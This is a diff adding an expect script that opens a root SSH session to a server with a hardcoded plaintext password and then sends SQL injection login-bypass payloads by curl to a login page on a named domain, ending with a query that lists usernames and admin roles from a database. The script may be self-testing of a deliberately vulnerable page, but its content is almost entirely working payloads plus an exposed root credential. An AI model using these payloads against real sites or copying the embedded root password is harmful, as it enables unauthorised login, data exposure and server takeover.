@@ -1,0 +1,47 @@
+#!/usr/bin/expect -f
+
+set timeout 30
+set password {$$R00tbeer02}
+
+spawn ssh root@155.138.197.128
+
+expect {
+    "password:" {
+        send "$password\r"
+    }
+    "yes/no" {
+        send "yes\r"
+        expect "password:"
+        send "$password\r"
+    }
+}
+
+expect "# "
+
+# Test SQL injection with curl
+send "echo 'Testing SQL injection payloads...'\r"
+expect "# "
+
+# Test 1: Basic bypass with admin' --
+send "curl -X POST https://wonkatech.org/logintest.php -d \"username=admin' -- &password=anything\" 2>/dev/null | grep -E '(success|error|Login successful)' | head -5\r"
+expect "# "
+
+# Test 2: OR 1=1 injection
+send "curl -X POST https://wonkatech.org/logintest.php -d \"username=admin' OR '1'='1' -- &password=anything\" 2>/dev/null | grep -E '(success|error|Login successful)' | head -5\r"
+expect "# "
+
+# Test 3: Get all users
+send "curl -X POST https://wonkatech.org/logintest.php -d \"username=' OR 1=1 -- &password=anything\" 2>/dev/null | grep -E '(success|error|Login successful)' | head -5\r"
+expect "# "
+
+# Check what users exist in the database
+send "mysql -u root wallys_monkey_parts -e \"SELECT username, role, is_admin FROM users;\" 2>/dev/null\r"
+expect "# "
+
+send "echo 'SQL injection tests complete!'\r"
+expect "# "
+
+send "exit\r"
+expect eof
+
+puts "\nSQL injection testing complete!"
